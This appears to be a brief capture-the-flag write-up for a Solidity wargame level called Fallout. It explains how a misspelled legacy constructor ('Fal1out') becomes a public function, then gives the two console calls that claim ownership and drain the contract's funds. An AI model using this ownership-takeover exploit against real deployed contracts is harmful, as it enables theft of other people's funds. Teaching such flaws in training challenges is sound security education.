This one is outdated :(

The trick here is in the constructor.

In older versions of solidity, constructors were *named* `constructor name === contract name`.

So:
``` javascript
contract ImAContract {
    // constructor
    function ImAContract public payable {}
}
```
is now
```javascript
contract ImAContract {
    // constructor
    constructor() public {}
}
```

So remember, the constructor is only called upon contract creation. If a constructor name was mispelled, it could be called like any other public function.

We can see clearly that the constructor of contract `Fallout` is mispelled as `Fal1out` and that if called, it makes the `msg.sender` owner of the contract and it allocates the owner the `msg.value`.

## Solution
1. Call the mispelled constructor
```javascript
contract.Fal1out({ from:player, value: toWei("0.0001", "ether") })
```
2. Collect fundz
```javascript
contract.collectAllocations()
```